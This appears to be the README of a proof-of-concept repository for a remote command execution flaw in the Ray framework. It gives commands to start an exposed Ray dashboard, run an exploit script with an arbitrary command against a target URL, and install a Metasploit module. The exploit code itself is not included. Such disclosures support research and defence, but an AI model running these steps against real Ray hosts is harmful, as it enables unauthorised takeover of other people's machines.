# PoC for a remote command execution vulnerability in Ray framework

Ray is a high-performance distributed execution engine and an open-source artificial intelligence framework. Anyscale, Inc Ray Ray Versions 2.9.3 to 2.40.0 have a command execution vulnerability, which allows an attacker to execute arbitrary commands and control the host where the framework runs.

# Demo
 open this https://github.com/honysyang/Ray/blob/main/output(compress-video-online.com).mp4

## Usage

First, install Ray:
```bash
pip3 install -U "ray[default]"
```
Then, start Ray:
```bash
ray start --head --dashboard-host=0.0.0.0
```
Run the Python exploit:
```bash
python3 exploit.py --host http://10.0.2.15:8265 --cmd '<cmd>'
```
## Metasploit module
Copy the Ruby file to Metasploit's related folder:
```bash
cp ray_job_rce.rb /usr/share/metasploit-framework/modules/exploits/multi/misc/
```
Launch Metasploit with `msfconsole` and relad modules with `reload_all` if you can't find the added one.
You can select with `use exploit/multi/misc/ray_job_rce`.
Set the necessary options (`RHOST`, `RPORT`, `COMMAND`, etc.) and run the exploit with the command `exploit`.

## Disclaimer
This exploit script has been created solely for research and the development of effective defensive techniques. It is not intended to be used for any malicious or unauthorized activities. The script's author and owner disclaim any responsibility or liability for any misuse or damage caused by this software. Just so you know, users are urged to use this software responsibly and only by applicable laws and regulations. Use responsibly.
